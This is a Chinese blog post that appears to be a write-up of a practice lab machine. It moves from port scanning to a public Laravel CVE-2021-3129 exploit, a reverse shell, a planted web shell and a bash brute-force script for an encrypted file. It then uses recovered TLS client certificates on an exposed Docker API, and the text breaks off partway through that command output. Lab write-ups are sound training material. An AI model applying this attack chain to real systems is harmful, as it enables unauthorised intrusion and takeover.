@@ -1,0 +1,711 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Seguimos hablando en el metro En el restaurante de Hunan  信息收集靶机ip：192.168.56.206 123456789101112131415161718192021222324252627282930313233343536RustScan: Where scanning meets swagging. 😎[~] The conf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机复盘-lara">
+<meta property="og:url" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="Seguimos hablando en el metro En el restaurante de Hunan  信息收集靶机ip：192.168.56.206 123456789101112131415161718192021222324252627282930313233343536RustScan: Where scanning meets swagging. 😎[~] The conf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_ocdoA8BXW7.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_02YSEXmqpr.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_NHBscbSsnU.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_ShAcTl4IB2.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_Q4DkpBYPY6.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/AntSword_clBY1kK3Mk.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_RdRCNMCtFA.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_MusnqrY3sM.png">
+<meta property="og:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_yHfqP5husm.png">
+<meta property="article:published_time" content="2026-01-06T06:31:35.000Z">
+<meta property="article:modified_time" content="2026-01-06T14:21:52.317Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="复盘">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_ocdoA8BXW7.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>靶机复盘-lara - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="靶机复盘-lara"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-06 14:31" pubdate>
+          January 6, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">靶机复盘-lara</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Seguimos hablando en el metro</p>
+<p>En el restaurante de Hunan</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>靶机ip：192.168.56.206</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">RustScan: Where scanning meets swagging. 😎<br><br>[~] The config <span class="hljs-keyword">file</span> <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at <span class="hljs-string">&quot;/root/.rustscan.toml&quot;</span><br>[!] <span class="hljs-keyword">File</span> limit <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your <span class="hljs-keyword">file</span> limit <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-symbol">&#x27;s</span> speed. <span class="hljs-keyword">Use</span> the Docker image, <span class="hljs-keyword">or</span> up the Ulimit <span class="hljs-keyword">with</span> &#x27;<span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span>:<span class="hljs-number">22</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span>:<span class="hljs-number">80</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span>:<span class="hljs-number">8000</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.95</span> ( https://nmap.org ) at <span class="hljs-number">2026</span>-<span class="hljs-number">01</span>-<span class="hljs-number">05</span> <span class="hljs-number">21</span>:<span class="hljs-number">07</span> EST<br>Initiating ARP Ping Scan at <span class="hljs-number">21</span>:<span class="hljs-number">07</span><br>Scanning <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span> [<span class="hljs-number">1</span> <span class="hljs-keyword">port</span>]<br>Completed ARP Ping Scan at <span class="hljs-number">21</span>:<span class="hljs-number">07</span>, <span class="hljs-number">0.05</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">21</span>:<span class="hljs-number">07</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">21</span>:<span class="hljs-number">07</span>, <span class="hljs-number">0.02</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.02</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">21</span>:<span class="hljs-number">07</span><br>Scanning <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span> [<span class="hljs-number">3</span> ports]<br>Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span><br>Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">22</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span><br>Discovered <span class="hljs-keyword">open</span> <span class="hljs-keyword">port</span> <span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span><br>Completed SYN Stealth Scan at <span class="hljs-number">21</span>:<span class="hljs-number">07</span>, <span class="hljs-number">0.03</span>s elapsed (<span class="hljs-number">3</span> total ports)<br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span><br>Host <span class="hljs-keyword">is</span> up, received arp-response (<span class="hljs-number">0.0011</span>s latency).<br>Scanned at <span class="hljs-number">2026</span>-<span class="hljs-number">01</span>-<span class="hljs-number">05</span> <span class="hljs-number">21</span>:<span class="hljs-number">07</span>:<span class="hljs-number">16</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br><span class="hljs-keyword">PORT</span>     STATE SERVICE  REASON<br><span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh      syn-ack ttl <span class="hljs-number">64</span><br><span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http     syn-ack ttl <span class="hljs-number">64</span><br><span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">open</span>  http-alt syn-ack ttl <span class="hljs-number">63</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">16</span>:<span class="hljs-number">0</span>A:<span class="hljs-number">15</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br><br>Read data files from: /usr/share/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.21</span> seconds<br>           Raw packets sent: <span class="hljs-number">4</span> (<span class="hljs-number">160</span>B) | Rcvd: <span class="hljs-number">4</span> (<span class="hljs-number">160</span>B)<br><br></code></pre></td></tr></table></figure>
+
+<p>访问80端口</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_ocdoA8BXW7.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试了一通命令注入无果，访问8000端口。</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_02YSEXmqpr.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到使用的框架及其版本，网上找了个能用的exp。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/joshuavanderpoll/CVE-2021-3129?tab=readme-ov-file#-docker-poc">joshuavanderpoll&#x2F;CVE-2021-3129: Laravel RCE Exploit Script - CVE-2021-3129 (user-friendly with automatic log detection)</a></p>
+<h3 id="GetNobody-Alice"><a href="#GetNobody-Alice" class="headerlink" title="GetNobody&#x2F;Alice"></a>GetNobody&#x2F;Alice</h3><hr>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_NHBscbSsnU.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_ShAcTl4IB2.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功弹回shell，但是一眼docker容器，尝试逃逸失败。</p>
+<p>扒拉了一阵信息也没什么有用的。</p>
+<p>但是这时发现容器的权限可以任意写入网页主目录。</p>
+<p>那么在网页主目录写马。</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_Q4DkpBYPY6.png" srcset="/img/loading.gif" lazyload></p>
+<p>用蚁剑成功连接</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/AntSword_clBY1kK3Mk.png" srcset="/img/loading.gif" lazyload></p>
+<p>在&#x2F;home下发现Alice用户及其文件ilovealice，怀疑是密码，之后成功以alice的身份登录。</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_RdRCNMCtFA.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr>
+<p>查看alice当前文件下目录，发现enc文件。</p>
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_MusnqrY3sM.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用老大提供的脚本解密，是一个压缩文件，之后得到三个pem文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> enc_brute.sh      <br><span class="hljs-comment">#!/bin/bash</span><br><br>INPUT_FILE=<span class="hljs-string">&quot;1.enc&quot;</span><br>DICTIONARY=<span class="hljs-string">&quot;techyou.txt&quot;</span><br><br><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r password; <span class="hljs-keyword">do</span><br>    openssl enc -aes-256-cbc -d -<span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$INPUT_FILE</span>&quot;</span> -out decrypted.tar.gz -iter 10000 -pbkdf2 -pass pass:<span class="hljs-string">&quot;<span class="hljs-variable">$password</span>&quot;</span> 2&gt;/dev/null<br><br>    <span class="hljs-keyword">if</span> [ $? -eq 0 ] ; <span class="hljs-keyword">then</span><br>        a=$(file decrypted.tar.gz|grep <span class="hljs-string">&#x27;decrypted.tar.gz: data&#x27;</span>)<br>        <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;------------------------------------------&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;找到密码: <span class="hljs-variable">$password</span>&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;文件已解密为: decrypted.tar.gz&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;------------------------------------------&quot;</span><br>        <span class="hljs-built_in">exit</span> 0<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$DICTIONARY</span>&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;字典已尝试完毕，未发现正确密码。&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> sudo bash enc_brute.sh </span><br><span class="hljs-section">------------------------------------------</span><br>找到密码: 060606<br><span class="hljs-section">文件已解密为: decrypted.tar.gz</span><br><span class="hljs-section">------------------------------------------</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/06/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-lara/vmware_yHfqP5husm.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后的路可以说是畅通无阻……才怪，首先我们要转发出去docker内部的api端口（之前的图已经转发到了8888）</p>
+<p>顺便说一下这几个pem的作用（AI）</p>
+<p>这三个文件分别对应身份验证中的“验证方”、“身份ID”和“本人证明”：</p>
+<p><strong>1. ca.pem（信任公章）</strong> 这是信任的根基。你的 Docker 客户端使用它来<strong>验证服务端</strong>的身份，确保你连接的是真正的目标服务器（192.168.56.207），防止连接到黑客伪造的“中间人”服务器。</p>
+<p><strong>2. client-cert.pem（公开身份证）</strong> 这是你的<strong>公开身份文件</strong>。在建立连接时，你会把它发送给 Docker 服务端，相当于出示一张门禁卡，告诉服务端：“我是被授权的用户，这是我的证件信息。”</p>
+<p><strong>3. client-key.pem（私钥指纹）</strong> 这是你的<strong>核心机密</strong>，相当于指纹或密码。服务端收到你的“身份证”后，会要求你用这个私钥进行数字签名。<strong>只有拥有此私钥，才能证明你确实是那张“身份证”的主人</strong>，从而获得 Root 控制权。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kali)-[/home/kali/Desktop/certs]<br>└─<span class="hljs-meta"># curl -k https:<span class="hljs-comment">//192.168.56.207:8888/version \</span></span><br><span class="hljs-comment"><span class="hljs-meta">  --cert client-cert.pem \</span></span><br><span class="hljs-comment"><span class="hljs-meta">  --key client-key.pem</span></span><br>&#123;<span class="hljs-string">&quot;Platform&quot;</span>:&#123;<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,<span class="hljs-string">&quot;Components&quot;</span>:[&#123;<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;Engine&quot;</span>,<span class="hljs-string">&quot;Version&quot;</span>:<span class="hljs-string">&quot;28.3.3&quot;</span>,<span class="hljs-string">&quot;Details&quot;</span>:&#123;<span class="hljs-string">&quot;ApiVersion&quot;</span>:<span class="hljs-string">&quot;1.51&quot;</span>,<span class="hljs-string">&quot;Arch&quot;</span>:<span class="hljs-string">&quot;amd64&quot;</span>,<span class="hljs-string">&quot;BuildTime&quot;</span>:<span class="hljs-string">&quot;2025-12-02T23:05:51.000000000+00:00&quot;</span>,<span class="hljs-string">&quot;Experimental&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>,<span class="hljs-string">&quot;GitCommit&quot;</span>:<span class="hljs-string">&quot;bea959c7b793b32a893820b97c4eadc7c87fabb0&quot;</span>,<span class="hljs-string">&quot;GoVersion&quot;</span>:<span class="hljs-string">&quot;go1.24.11&quot;</span>,<span class="hljs-string">&quot;KernelVersion&quot;</span>:<span class="hljs-string">&quot;6.12.59-0-lts&quot;</span>,<span class="hljs-string">&quot;MinAPIVersion&quot;</span>:<span class="hljs-string">&quot;1.24&quot;</span>,<span class="hljs-string">&quot;Os&quot;</span>:<span class="hljs-string">&quot;linux&quot;</span>&#125;&#125;,&#123;<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;containerd&quot;</span>,<span class="hljs-string">&quot;Version&quot;</span>:<span class="hljs-string">&quot;v2.1.5&quot;</span>,<span class="hljs-string">&quot;Details&quot;</span>:&#123;<span class="hljs-string">&quot;GitCommit&quot;</span>:<span class="hljs-string">&quot;fcd43222d6b07379a4be9786bda52438f0dd16a1&quot;</span>&#125;&#125;,&#123;<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;runc&quot;</span>,<span class="hljs-string">&quot;Version&quot;</span>:<span class="hljs-string">&quot;1.3.4&quot;</span>,<span class="hljs-string">&quot;Details&quot;</span>:&#123;<span class="hljs-string">&quot;GitCommit&quot;</span>:<span class="hljs-string">&quot;d842d7719497cc3b774fd71620278ac9e17710e0&quot;</span>&#125;&#125;,&#123;<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-string">&quot;docker-init&quot;</span>,<span class="hljs-string">&quot;Version&quot;</span>:<span class="hljs-string">&quot;0.19.0&quot;</span>,<span class="hljs-string">&quot;Details&quot;</span>:&#123;<span class="hljs-string">&quot;GitCommit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;Version&quot;</span>:<span class="hljs-string">&quot;28.3.3&quot;</span>,<span class="hljs-string">&quot;ApiVersion&quot;</span>:<span class="hljs-string">&quot;1.51&quot;</span>,<span class="hljs-string">&quot;MinAPIVersion&quot;</span>:<span class="hljs-string">&quot;1.24&quot;</span>,<span class="hljs-string">&quot;GitCommit&quot;</span>:<span class="hljs-string">&quot;bea959c7b793b32a893820b97c4eadc7c87fabb0&quot;</span>,<span class="hljs-string">&quot;GoVersion&quot;</span>:<span class="hljs-string">&quot;go1.24.11&quot;</span>,<span class="hljs-string">&quot;Os&quot;</span>:<span class="hljs-string">&quot;linux&quot;</span>,<span class="hljs-string">&quot;Arch&quot;</span>:<span class="hljs-string">&quot;amd64&quot;</span>,<span class="hljs-string">&quot;KernelVersion&quot;</span>:<span class="hljs-string">&quot;6.12.59-0-lts&quot;</span>,<span class="hljs-string">&quot;BuildTime&quot;</span>:<span class="hljs-string">&quot;2025-12-02T23:05:51.000000000+00:00&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>用curl查看，确定可以访问。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>certs]<br>└─<span class="hljs-comment"># docker --tls \</span><br>  <span class="hljs-operator">-</span>-tlscert<span class="hljs-operator">=</span>client-cert.pem \<br>  <span class="hljs-operator">-</span>-tlskey<span class="hljs-operator">=</span>client-key.pem \<br>  <span class="hljs-operator">-</span>H tcp:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.207</span>:<span class="hljs-number">8888</span> \<br>  version<br><span class="hljs-params">Client:</span><br> <span class="hljs-params">Version:</span>           <span class="hljs-number">26.1</span>.<span class="hljs-number">5</span><span class="hljs-operator">+</span>dfsg1<br> API <span class="hljs-params">version:</span>       <span class="hljs-number">1.45</span><br> Go <span class="hljs-params">version:</span>        go1.<span class="hljs-number">24.2</span><br> Git <span class="hljs-params">commit:</span>        a72d7cd<br> <span class="hljs-params">Built:</span>             Sat May <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">32</span> <span class="hljs-number">2025</span><br> OS<span class="hljs-operator">/</span><span class="hljs-params">Arch:</span>           linux<span class="hljs-symbol">/amd64</span><br> <span class="hljs-params">Context:</span>           default<br><br><span class="hljs-params">Server:</span><br> <span class="hljs-params">Engine:</span><br>  <span class="hljs-params">Version:</span>          <span class="hljs-number">28.3</span>.<span class="hljs-number">3</span><br>  API <span class="hljs-params">version:</span>      <span 